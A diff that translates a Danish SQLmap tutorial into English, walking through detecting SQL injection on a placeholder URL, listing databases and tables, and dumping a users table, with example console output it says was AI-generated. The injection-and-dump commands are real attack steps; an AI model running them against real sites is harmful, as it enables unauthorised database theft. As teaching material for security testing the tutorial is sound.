@@ -1,11 +1,11 @@
 # SQLmap
-## 1: Scan target-url som har en eller flere parametre
--u er et af de mest fundamentale options til SQLmap, som først og fremmest er shorthand for --url 
-og som basically betyder at det url der bliver givet er target. --batch siger "Y, Yes" og "Continue" til alle prompts under scanningen.
+## 1: Scan target-url that has one or more parameters
+-u is one of the most fundamental options to SQLmap, which is first and foremost shorthand for --url
+and which basically means that the url given is target. --batch says "Y, Yes" and "Continue" to all prompts during the scan.
 ```bash
 sqlmap -u "http://www.target.com/page.php?id=58" --batch
 ```
-Herefter vil du ofte blive mødt med noget som dette
+After this you will often be met with something like this
 ```console
 [10:36:01] [INFO] testing connection to the target URL
 [10:36:01] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
@@ -15,7 +15,7 @@ you have not declared cookie(s), while server wants to set its own ('__cf_bm=hir
 [10:36:02] [INFO] testing if the target URL content is stable
 [10:36:02] [WARNING] target URL content is not stable (i.e. content differs).
 ```
-Hvis der bliver fundet en sårbarhed i dit target URL vil det ligne noget alá det her.
+If a vulnerability is found in your target URL, it will look something like this.
 ```console
 Parameter: id (GET)
     Type: boolean-based blind
@@ -37,13 +37,13 @@ back-end DBMS: MySQL >= 5.0
 ```
 
 
-## 2: Efter initial scan, så find detaljerede informationer på target databaser
-Her er kommandoen "-dbs" vigtig, da det er den der finder alle de tilængelige
-databaser med deres navne.
+## 2: After initial scan, then find detailed information on target databases
+Here the "-dbs" command is important, as it is the one that finds all available
+databases with their names.
 ```bash
 sqlmap -u "http://www.target.com/page.php?id=58" --dbs --batch
 ```
-Hvis scanningen lykkes, vil du måske få noget som dette.
+If the scan is successful, you will perhaps get something like this.
 ```console
 [13:37:00] [INFO] fetching database names
 available databases [2]:
@@ -51,13 +51,13 @@ available databases [2]:
 [*] acme_shop_db
 ```
 
-## 3: Udvælg en database og find tabeller
-Det er nu tid til at vælge en af de databaser som er fundet i step 2. I dette eksempel "acme_shop_db" og se hvilke tabeller den indeholder.
-Her bruger man -D til at navngive/vælge den ønskede Database og --tables option, til at finde de tabeller til databasen.
+## 3: Select a database and find tables
+It is now time to select one of the databases found in step 2. In this example "acme_shop_db" and see what tables it contains.
+Here you use -D to name/select the desired Database and --tables option, to find the tables for the database.
 ```bash
 sqlmap -u "http://www.target.com/page.php?id=58" -D acme_shop_db --tables --batch
 ```
-Hvor du så vil blive mødt med noget som dette.
+Where you will then be met with something like this.
 ```console
 Database: acme_shop_db
 [4 tables]
@@ -69,13 +69,13 @@ Database: acme_shop_db
 +-----------+
 ```
 
-## 4: Hent data fra tabellen (dump)
-Den fjerde og sidste del ville så være at hente den data du har fundet frem til igennem SQLmap som gøres således.
+## 4: Fetch data from the table (dump)
+The fourth and last part would then be to retrieve the data you have found through SQLmap which is done like this.
 ```bash
 sqlmap -u "http://www.target.com/page.php?id=58" -D acme_shop_db -T users --dump --batch
 ```
 
-Som måske ville kunne se sådan ud (afhængig af hvordan databasen er blevet designet)
+Which might look something like this (depending on how the database was designed)
 ```console
 Database: acme_shop_db
 Table: users
@@ -103,4 +103,4 @@ Table: users
 
 
 
-NOTE: Outputs der er brugt som eksempler på hvordan et reelt output kunne se ud er generet med AI og ikke med ægte Hosts.
+NOTE: Outputs used as examples of what a real output could look like were generated with AI and not with real Hosts.
